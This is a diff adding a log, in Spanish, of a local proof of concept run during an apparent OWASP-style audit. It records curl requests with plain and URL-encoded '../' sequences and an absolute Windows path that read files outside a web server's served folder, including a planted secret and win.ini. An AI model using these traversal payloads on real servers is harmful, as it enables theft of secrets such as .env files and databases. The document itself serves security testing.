@@ -1,0 +1,31 @@
+# Demostracion LOCAL (127.0.0.1:8121, RUTA_INTERFAZ=%TEMP%/owaspaud/interfaz; existe %TEMP%/owaspaud/secreto_fuera.txt FUERA de la carpeta de la interfaz). 2026-11-12T17:05:21-05:00
+== curl --path-as-is http://127.0.0.1:8121/index.html
+<html>ok</html>
+
+[HTTP 200]
+== curl --path-as-is http://127.0.0.1:8121/../secreto_fuera.txt
+CONTENIDO-FUERA-DE-INTERFAZ (simula un .env o la base sqlite)
+
+[HTTP 200]
+== curl --path-as-is http://127.0.0.1:8121/%2e%2e/secreto_fuera.txt
+CONTENIDO-FUERA-DE-INTERFAZ (simula un .env o la base sqlite)
+
+[HTTP 200]
+== curl --path-as-is http://127.0.0.1:8121/..%2fsecreto_fuera.txt
+CONTENIDO-FUERA-DE-INTERFAZ (simula un .env o la base sqlite)
+
+[HTTP 200]
+== curl --path-as-is http://127.0.0.1:8121/%2e%2e%2fsecreto_fuera.txt
+CONTENIDO-FUERA-DE-INTERFAZ (simula un .env o la base sqlite)
+
+[HTTP 200]
+== curl --path-as-is http://127.0.0.1:8121/assets/..%2f..%2fsecreto_fuera.txt
+{"detail":"Not Found"}
+[HTTP 404]
+== Ruta absoluta (pathlib descarta la base si el segmento es absoluto): curl --path-as-is http://127.0.0.1:8121/C:/Windows/win.ini
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
